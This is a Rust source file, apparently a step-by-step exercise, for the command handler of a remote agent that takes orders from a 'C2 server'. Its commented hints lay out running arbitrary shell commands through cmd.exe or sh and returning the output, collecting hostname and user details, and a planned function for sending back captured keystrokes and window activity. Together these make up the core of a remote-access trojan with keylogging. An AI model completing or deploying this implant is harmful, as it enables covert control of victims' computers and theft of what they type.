use std::process::{Command as StdCommand, Stdio};
use log::{info, error};
use serde::{Deserialize, Serialize};

/// Command types that agent can execute
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CommandType {
    Shell,
    Sysinfo,
    Ping,
    GetActivityData,
}

/// Command from C2 server
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentCommand {
    pub id: String,
    pub agent_id: String,
    pub command_type: CommandType,
    pub payload: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
}

/// Result of command execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    pub agent_id: String,
    pub command_id: String,
    pub success: bool,
    pub output: String,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Execute a command and return the result
pub fn execute_command(cmd: AgentCommand, agent_id: String) -> CommandResult {
    info!("Executing command: {:?} - Payload: {}", cmd.command_type, cmd.payload);

    let (success, output) = match cmd.command_type {
        CommandType::Shell => execute_shell(&cmd.payload),
        CommandType::Sysinfo => get_system_info(),
        CommandType::Ping => ping_response(),
        CommandType::GetActivityData => get_activity_data(),
    };

    CommandResult {
        agent_id,
        command_id: cmd.id,
        success,
        output,
        timestamp: chrono::Utc::now(),
    }
}

// ============================================================================
// COMMAND IMPLEMENTATIONS
// ============================================================================

/// Execute shell command
///
/// **YOUR TASK:** Implement this!
///
/// **What it should do:**
/// 1. Determine OS (Windows vs Unix)
/// 2. Run command using std::process::Command
/// 3. Capture stdout and stderr
/// 4. Return (success: bool, output: String)
///
/// **HINTS:**
/// - Windows: cmd.exe /C <command>
/// - Unix: sh -c <command>
/// - Use .output() to capture result
/// - Combine stdout and stderr
fn execute_shell(command: &str) -> (bool, String) {
    info!("Executing shell command: {}", command);

    // TODO: Determine which shell to use based on OS
    // HINT:
    // #[cfg(target_os = "windows")]
    // let shell = "cmd";
    // let shell_arg = "/C";
    //
    // #[cfg(not(target_os = "windows"))]
    // let shell = "sh";
    // let shell_arg = "-c";

    // TODO: Execute command
    // HINT:
    // let output = StdCommand::new(shell)
    //     .arg(shell_arg)
    //     .arg(command)
    //     .output();

    // TODO: Handle result
    // HINT:
    // match output {
    //     Ok(result) => {
    //         let stdout = String::from_utf8_lossy(&result.stdout);
    //         let stderr = String::from_utf8_lossy(&result.stderr);
    //         let combined = format!("{}{}", stdout, stderr);
    //         (result.status.success(), combined)
    //     }
    //     Err(e) => (false, format!("Failed to execute: {}", e)),
    // }

    // TEMPORARY - Replace with your implementation
    (false, "Not implemented yet".to_string())
}

/// Get system information
///
/// **YOUR TASK:** Implement this!
///
/// **What it should do:**
/// 1. Get OS name and version
/// 2. Get hostname
/// 3. Get current user
/// 4. Get IP address (optional)
/// 5. Return formatted string
///
/// **HINTS:**
/// - OS: std::env::consts::OS
/// - Hostname: hostname::get()
/// - User: std::env::var("USER") or whoami::username()
fn get_system_info() -> (bool, String) {
    info!("Gathering system information");

    // TODO: Collect system info
    // HINT:
    // let os = std::env::consts::OS;
    // let arch = std::env::consts::ARCH;
    // let hostname = hostname::get().unwrap_or_default().to_string_lossy().to_string();
    // let username = whoami::username();
    //
    // let info = format!(
    //     "OS: {}\nArch: {}\nHostname: {}\nUser: {}",
    //     os, arch, hostname, username
    // );
    //
    // (true, info)

    // TEMPORARY - Replace with your implementation
    let info = format!(
        "OS: {}\nArch: {}",
        std::env::consts::OS,
        std::env::consts::ARCH
    );
    (true, info)
}

/// Simple ping response to test connectivity
fn ping_response() -> (bool, String) {
    info!("Responding to ping");
    (true, "pong".to_string())
}

/// Get activity data (keystrokes, windows)
///
/// **YOUR TASK:** Implement this later!
///
/// **What it should do:**
/// 1. Access shared keystroke tracker
/// 2. Get recent activity events
/// 3. Format as JSON
/// 4. Return data
///
/// **NOTE:** This requires access to trackers - we'll implement after integration
fn get_activity_data() -> (bool, String) {
    info!("Retrieving activity data");

    // TODO: Access activity trackers and get data
    // This will be implemented after we integrate C2 client with main.rs

    (true, "Activity data retrieval not yet integrated".to_string())
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ping() {
        let (success, output) = ping_response();
        assert!(success);
        assert_eq!(output, "pong");
    }

    #[test]
    fn test_sysinfo() {
        let (success, output) = get_system_info();
        assert!(success);
        assert!(output.contains("OS:"));
    }

    // TODO: Add test for shell execution
    // #[test]
    // fn test_shell_echo() {
    //     #[cfg(not(target_os = "windows"))]
    //     let (success, output) = execute_shell("echo test");
    //
    //     #[cfg(target_os = "windows")]
    //     let (success, output) = execute_shell("echo test");
    //
    //     assert!(success);
    //     assert!(output.contains("test"));
    // }
}
